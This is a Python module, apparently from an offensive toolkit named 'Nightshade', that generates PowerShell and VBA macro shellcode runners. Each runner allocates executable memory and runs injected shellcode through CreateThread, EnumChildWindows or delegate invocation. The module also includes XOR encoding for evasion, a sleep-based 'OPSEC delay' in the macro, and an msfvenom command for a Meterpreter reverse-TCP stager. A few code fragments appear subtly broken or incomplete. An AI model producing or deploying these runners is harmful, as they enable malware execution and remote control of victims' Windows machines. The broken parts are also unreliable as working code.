"""
Nightshade Shellcode Generation Module.
Generates PowerShell and VBA shellcode runners that:
  - Allocate RWX memory via VirtualAlloc
  - Copy shellcode bytes into allocated memory
  - Execute via CreateThread, EnumChildWindows callback, or delegate invocation
All code executes ON THE TARGET (Windows).
"""
import random
import string
import base64
from typing import Optional


class ShellcodeGenerator:
    """Generates position-independent shellcode runners for PowerShell and VBA."""

    @staticmethod
    def _random_var(length: int = 8) -> str:
        prefix = random.choice(["$", "$global:"])
        return prefix + '_' + ''.join(random.choices(string.ascii_lowercase, k=length))

    # ------------------------------------------------------------------ #
    #  PowerShell shellcode runners                                        #
    # ------------------------------------------------------------------ #

    @staticmethod
    def powershell_create_thread(shellcode_b64: str) -> str:
        """Generate PowerShell that allocates RWX memory and executes via CreateThread."""
        v1 = ShellcodeGenerator._random_var()
        v2 = ShellcodeGenerator._random_var()
        v3 = ShellcodeGenerator._random_var()
        v4 = ShellcodeGenerator._random_var()
        v5 = ShellcodeGenerator._random_var()
        v6 = ShellcodeGenerator._random_var()

        return f'''
# Shellcode runner - CreateThread
${v1} = [System.Convert]::FromBase64String("{shellcode_b64}")

# VirtualAlloc: RWX memory
${v2} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    ([System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate(
        [Func[IntPtr, uint, uint, uint, IntPtr]]($null))
    ), [Func[IntPtr, uint, uint, uint, IntPtr]]
).Module.GetType('System.Runtime.InteropServices.Marshal').GetMethods('NonPublic,Static')

# Manual VirtualAlloc via Win32 API
${v3} = Add-Type -MemberDefinition @"
[DllImport("kernel32")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("kernel32")]
public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
"@ -Name "Win32" -Namespace "Nightshade" -PassThru

${v4} = ${v3}::VirtualAlloc([IntPtr]::Zero, ${v1}.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy(${v1}, 0, ${v4}, ${v1}.Length)
${v5} = ${v3}::CreateThread([IntPtr]::Zero, 0, ${v4}, [IntPtr]::Zero, 0, [IntPtr]::Zero)
${v3}::WaitForSingleObject(${v5}, 0xFFFFFFFF)
'''.strip()

    @staticmethod
    def powershell_enum_child_windows(shellcode_b64: str) -> str:
        """Generate PowerShell shellcode runner using EnumChildWindows callback technique."""
        v1 = ShellcodeGenerator._random_var()
        v2 = ShellcodeGenerator._random_var()
        v3 = ShellcodeGenerator._random_var()

        return f'''
# Shellcode runner - EnumChildWindows callback injection
${v1} = [System.Convert]::FromBase64String("{shellcode_b64}")

${v2} = Add-Type -MemberDefinition @"
[DllImport("kernel32")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
[DllImport("kernel32")]
public static extern IntPtr GetModuleHandle(string lpModuleName);
[DllImport("user32")]
public static extern bool EnumChildWindows(IntPtr hWndParent, IntPtr lpEnumFunc, IntPtr lParam);
"@ -Name "Win32" -Namespace "Nightshade" -PassThru

${v3} = ${v2}::VirtualAlloc([IntPtr]::Zero, ${v1}.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy(${v1}, 0, ${v3}, ${v1}.Length)

# Trigger via EnumChildWindows callback
${v2}::EnumChildWindows([IntPtr]::Zero, ${v3}, [IntPtr]::Zero)
'''.strip()

    @staticmethod
    def powershell_delegate_invoke(shellcode_b64: str) -> str:
        """Generate PowerShell shellcode runner using delegate invocation."""
        v1 = ShellcodeGenerator._random_var()
        v2 = ShellcodeGenerator._random_var()
        v3 = ShellcodeGenerator._random_var()
        v4 = ShellcodeGenerator._random_var()

        return f'''
# Shellcode runner - Delegate invoke
${v1} = [System.Convert]::FromBase64String("{shellcode_b64}")

${v2} = Add-Type -MemberDefinition @"
[DllImport("kernel32")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
"@ -Name "Win32" -Namespace "Nightshade" -PassThru

${v3} = ${v2}::VirtualAlloc([IntPtr]::Zero, ${v1}.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy(${v1}, 0, ${v3}, ${v1}.Length)

# Create delegate and invoke
${v4} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${v3}, [Type]([Action]))
${v4}.Invoke()
'''.strip()

    @staticmethod
    def powershell_random_runner(shellcode_b64: str) -> str:
        """Pick a random shellcode runner technique."""
        runners = [
            ShellcodeGenerator.powershell_create_thread,
            ShellcodeGenerator.powershell_enum_child_windows,
            ShellcodeGenerator.powershell_delegate_invoke,
        ]
        return random.choice(runners)(shellcode_b64)

    # ------------------------------------------------------------------ #
    #  VBA shellcode runners                                                #
    # ------------------------------------------------------------------ #

    @staticmethod
    def vba_create_thread(shellcode_b64: str) -> str:
        """Generate VBA that allocates RWX memory and executes shellcode via CreateThread."""
        return f'''
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" _
    (ByVal lpAddress As LongPtr, ByVal dwSize As Long, _
     ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function CreateThread Lib "kernel32" _
    (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, _
     ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, _
     ByVal dwCreationFlags As Long, ByVal lpThreadId As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" _
    (ByVal destAddr As LongPtr, ByVal sourceAddr As LongPtr, _
     ByVal length As Long) As Long

Private Declare PtrSafe Function Sleep Lib "kernel32" _
    (ByVal dwMilliseconds As Long) As Long

Sub RunShellcode()
    Dim buf As Variant
    Dim scBytes() As Byte
    Dim addr As LongPtr
    Dim threadId As LongPtr
    Dim i As Long
    
    ' Decode base64 shellcode
    buf = Base64Decode("{shellcode_b64}")
    scBytes = buf
    
    ' OPSEC delay
    Sleep 2000 + (Rnd * 3000)
    
    ' Allocate RWX memory
    addr = VirtualAlloc(0, UBound(scBytes) + 1, &H1000, &H40)
    
    If addr = 0 Then Exit Sub
    
    ' Copy shellcode byte by byte
    For i = 0 To UBound(scBytes)
        RtlMoveMemory addr + i, VarPtr(scBytes(i)), 1
    Next i
    
    ' Execute
    threadId = CreateThread(0, 0, addr, 0, 0, 0)
    If threadId <> 0 Then Sleep 30000
End Sub
'''.strip()

    # ------------------------------------------------------------------ #
    #  Helpers                                                             #
    # ------------------------------------------------------------------ #

    @staticmethod
    def encode_shellcode(raw_bytes: bytes) -> str:
        """Encode raw shellcode bytes as base64 for embedding."""
        return base64.b64encode(raw_bytes).decode()

    @staticmethod
    def xor_encode_shellcode(raw_bytes: bytes, key: Optional[bytes] = None) -> tuple[bytes, bytes]:
        """XOR-encode shellcode bytes with a random key for basic evasion."""
        if key is None:
            key = bytes([random.randint(1, 255) for _ in range(16)])
        encoded = bytes([b ^ key[i % len(key)] for i, b in enumerate(raw_bytes)])
        return encoded, key

    @staticmethod
    def generate_msf_powershell_stager(lhost: str, lport: int, payload: str = "windows/x64/meterpreter/reverse_tcp") -> str:
        """Generate a note about generating MSF shellcode (does not create actual shellcode)."""
        return f'''
# Metasploit shellcode stager placeholder
# Generate shellcode with:
#   msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f powershell -o shellcode.ps1
# Then embed using:
#   $sc = [System.Convert]::FromBase64String("...")
#   [System.Runtime.InteropServices.Marshal]::Copy($sc, 0, [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
#       (Add-Type -MemberDefinition "[DllImport(\\"kernel32\\")]public static extern IntPtr VirtualAlloc(IntPtr,uint,uint,uint);" -Name "K" -PassThru)::VirtualAlloc(0,$sc.Length,0x3000,0x40), [Type]([Action])), $sc.Length)
#   $del.Invoke()
'''.strip()
